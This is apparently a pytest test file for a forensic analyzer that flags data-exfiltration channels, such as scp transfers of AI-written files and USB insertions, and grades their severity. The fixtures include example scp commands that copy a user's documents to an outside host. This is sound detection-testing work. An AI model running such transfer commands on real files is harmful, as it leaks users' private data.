from __future__ import annotations

from collections.abc import Iterator
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import pytest

from aitrace.analyzers.exfil_channels import ANALYZER, USB_LIMITATION
from aitrace.core.ids import make_id
from aitrace.core.kinds import Actor, ArtifactKind, EventCategory, FindingCategory, Severity
from aitrace.core.model import Artifact, Event, Finding, Provenance
from aitrace.db.store import CaseStore

T0 = datetime(2026, 10, 1, 1, 0, 0, tzinfo=UTC)
PROPOSAL = "/Users/kim/work/proposal.md"
SCP_PROPOSAL = f"scp {PROPOSAL} kim@files.example.com:/tmp/"


def _art(aid: str, kind: ArtifactKind, data: dict[str, Any]) -> Artifact:
    return Artifact(
        id=aid,
        kind=kind,
        provenance=Provenance(evidence_id="ev", volume=0, source_path="/src", plugin="p", plugin_version="1.0"),
        data=data,
        user="kim",
    )


def _event(
    aid: str,
    ts: datetime,
    category: EventCategory = EventCategory.AI_ACTIVITY,
    actor: Actor = Actor.AI,
) -> Event:
    return Event(
        id=make_id("e", aid),
        artifact_id=aid,
        ts_utc=ts,
        ts_kind="k",
        ts_basis="native_utc",
        category=category,
        actor=actor,
        user="kim",
        summary="s",
    )


def _ai_write(aid: str, path: str, ts: datetime) -> list[Artifact | Event]:
    data: dict[str, Any] = {
        "tool": "Claude Code",
        "session_id": "s",
        "call_name": "Write",
        "input": {},
        "file_path": path,
    }
    return [_art(aid, ArtifactKind.AI_TOOL_CALL, data), _event(aid, ts)]


def _shell(aid: str, command: str, ts: datetime) -> list[Artifact | Event]:
    data: dict[str, Any] = {"shell": "bash", "command": command, "tags": ["transfer"], "rule_ids": ["TR-SCP"]}
    return [
        _art(aid, ArtifactKind.SHELL_COMMAND, data),
        _event(aid, ts, category=EventCategory.EXECUTION, actor=Actor.HUMAN),
    ]


@pytest.fixture
def store(tmp_path: Path) -> Iterator[CaseStore]:
    s = CaseStore(tmp_path / "case.sqlite")
    yield s
    s.close()


def _findings(store: CaseStore) -> list[Finding]:
    return [r for r in ANALYZER.run(store, "UTC") if isinstance(r, Finding)]


def test_scp_of_ai_written_file_is_high(store: CaseStore) -> None:
    store.add(
        [
            *_ai_write("tc1", PROPOSAL, T0),
            *_shell("sh1", SCP_PROPOSAL, T0 + timedelta(hours=3)),
        ]
    )
    findings = _findings(store)
    assert len(findings) == 1
    finding = findings[0]
    assert finding.category is FindingCategory.EXFIL_CHANNEL
    assert finding.severity is Severity.HIGH
    assert finding.rule_id == "TR-SCP"
    assert finding.title == "Exfiltration channel: TR-SCP to files.example.com"
    assert finding.data["channel"] == "TR-SCP to files.example.com"
    assert finding.data["destination"] == "files.example.com"
    assert finding.data["actor"] == Actor.HUMAN.value
    assert PROPOSAL in finding.narrative
    assert "files.example.com" in finding.narrative
    assert "AI tool call targeted" in finding.narrative


def test_usb_insert_without_files_is_medium_with_copy_limitation(store: CaseStore) -> None:
    store.add(
        [
            _art(
                "usb1",
                ArtifactKind.USB_DEVICE,
                {"vendor": "Kingston", "product": "DataTraveler", "serial": "X1", "source": "setupapi"},
            ),
            _event("usb1", T0, category=EventCategory.DEVICE, actor=Actor.SYSTEM),
        ]
    )
    findings = _findings(store)
    assert len(findings) == 1
    finding = findings[0]
    assert finding.category is FindingCategory.EXFIL_CHANNEL
    assert finding.severity is Severity.MEDIUM
    assert finding.rule_id == "EXFIL-USB"
    assert finding.data["channel"] == "USB Kingston DataTraveler"
    assert USB_LIMITATION in finding.limitations


@pytest.mark.parametrize(
    ("minutes", "expected"),
    [(30, Severity.HIGH), (90, Severity.MEDIUM)],
)
def test_transfer_severity_follows_60_minute_ai_window(
    store: CaseStore, minutes: int, expected: Severity
) -> None:
    store.add(
        [
            *_ai_write("tc1", "/Users/kim/work/other.md", T0),
            *_shell(
                "sh1",
                "scp /Users/kim/Desktop/notes.txt kim@files.example.com:/tmp/",
                T0 + timedelta(minutes=minutes),
            ),
        ]
    )
    findings = _findings(store)
    assert len(findings) == 1
    assert findings[0].severity is expected
